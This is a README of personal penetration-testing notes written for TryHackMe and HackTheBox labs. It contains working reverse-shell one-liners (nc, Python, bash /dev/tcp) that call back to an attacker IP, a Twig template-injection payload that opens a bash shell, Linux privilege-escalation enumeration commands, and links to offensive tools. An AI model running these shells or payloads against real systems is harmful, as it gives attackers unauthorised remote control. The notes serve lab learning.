# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe and HackTheBxo platforms. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

#### Introduction

In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.

### [notes](./other/notes.md)

### [web](./other/web.md)

### [osint](./other/osint.md)

---

#### Reverse shells

```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```bash
bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
```

```js
{{this.controller.getTwig().registerUndefinedFilterCallback("passthru")}}
{{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
```

---
### Linux Privilege Escalation:

#### information gathering

```bash
cat /proc/version
cat /etc/issue
cat /etc/sudoers
ps aux | grep cron
ps
env
ip route
uname -a
netstat # -at -l -t -tp -i
netstat -tupln | grep LISTEN
ss -atur
find / -writable 2>/dev/null
find / -mtime 10 #find files that were modified in the last 10 days
find . -name flag.txt
find / -type d -name config #find the directory named config under “/”
find / -type f -user <user> 2>/dev/null #find files owned by user
find / -type f -perm /4000 2>/dev/null
find / -type f -group <group> -exec ls -l {} + 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/exports #file sharing
nmap --script=vuln <ip>
cat /proc/1/cgroup #if u in docker
```
#### quik one-line bash script with colorful output to enumerate linux machine

```bash
for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/version" "cat /etc/issue" "cat /etc/sudoers" "cat /etc/sudoers.d" "env" "ip route" "uname -a" "netstat -tupln | grep LISTEN" "find / -type f -perm /4000 2>/dev/null" "getcap -r / 2>/dev/null" "cat /etc/exports" "cat /proc/1/cgroup"; do echo  "\n\033[1;34mCommand: $cmd\033[0m"; echo "\033[1;32m$(eval $cmd)\033[0m"; echo  "\033[1;33m\n===================================================================================================\n==================================================================================================="; done
```
#### linux priv esc links
* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [linEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
* [GTFOBins (unix)](https://gtfobins.github.io/)
* [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [linux backdoors](./linux_backdoors.md)

#### [other](./other/src/linux_priv_esc.md)

---
#### [windows](./other/windows.md)

---

### links
#### notes
- [cve.mitre.org](https://cve.mitre.org/cve/)
- [WTFBINS (cve)](https://wtfbins.wtf/)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- [tmpfiles](https://tmpfiles.org/)
#### Encoding techniques:
- [splitbrain](https://www.splitbrain.org/_static/ook/)
- [hashes](https://hashes.com/en/tools/hash_identifier)
- [md5hashing](https://md5hashing.net/hash)
- [cyberchef](https://gchq.github.io/CyberChef/)
- [crackstation](https://crackstation.net/)
- [md5decrypt.net](https://md5decrypt.net/en/)
- [vigenere brute force](https://www.guballa.de/vigenere-solver)
- [html enteties](https://www.webatic.com/html-entities-convertor)
- [list of signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
- [xxs-encoder](http://evuln.com/tools/xss-encoder/)
#### Tools
- [reconftw](https://github.com/six2dez/reconftw)
- [google dorks](/HackNotes/other/src/dorks.md)
- [gowitness](https://github.com/sensepost/gowitness) (screenshots)
- [meg](https://github.com/tomnomnom/meg)(fetch many paths for many hosts)
- [arjun](https://github.com/s0md3v/Arjun)(http param discovery)
- [x8](https://github.com/Sh1Yo/x8)(like arjun)
- [dalfox](https://github.com/hahwul/dalfox)(find xxs)
- [XXSHunter](https://xsshunter.trufflesecurity.com/app/#/)

[other links](./other/src/links.md)

---

Happy hacking!
